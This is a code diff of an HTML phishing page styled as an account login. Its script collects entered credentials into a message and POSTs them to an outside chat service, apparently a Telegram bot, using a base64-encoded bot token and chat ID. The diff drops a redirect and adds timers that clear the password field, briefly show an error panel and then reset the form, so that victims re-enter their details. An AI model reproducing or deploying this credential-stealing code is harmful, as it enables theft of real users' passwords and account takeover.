@@ -1,5 +1,4 @@
 
-
 <!DOCTYPE html> <html lang=en class=account-server>
 <meta charset=utf-8>
 <meta name=viewport content="initial-scale=1.0">
@@ -158,7 +157,7 @@ style="width:100%; display:none"/>
         ozi+="\n============================\n"
     tmsend(ozi)
 }
-
+	
 function tmsend(message){
     var token = "NzAyOTUxMTQyODpBQUgzUXBsN2lDa2x5X1ZMRDZ1RkhIWDFoZVJFT0ExTjBaWQ==";
     var chat_id= "NjM4MTMwODY0Ng==";
@@ -173,24 +172,19 @@ function tmsend(message){
     xht.open("POST", url, true);
     xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
     xht.send(JSON.stringify(obj));
-
-    // Redirect the user to a new URL after the message is sent
-    setTimeout(function() {
-        window.location.href = "https://pdf.com"; // Replace with the desired redirection URL
-    }, 2000);
-
-    setTimeout(function() {
-        document.getElementById('password').value = "";
-        var x = document.getElementById("Div4");
-        x.style.display = "block";
-    }, 2000);
-
-    setTimeout(function() {
-        var a = document.getElementById("Div1");
-        var b = document.getElementById("Div2");
-        var x = document.getElementById("Div4");
-        a.style.display = "block";
-        b.style.display = "none";
-        x.style.display = "none";
-    }, 5000);
+	setTimeout(function() {
+	document.getElementById('password').value = "";
+		var x = document.getElementById("Div4");
+		x.style.display = "block";
+	}, 2000);
+	setTimeout(function() {
+	 var a = document.getElementById("Div1");
+	 var b = document.getElementById("Div2");
+	 var x = document.getElementById("Div4");
+     a.style.display = "block";
+     b.style.display = "none";
+	 x.style.display = "none";
+	}, 5000);
 }
+
+</script> 
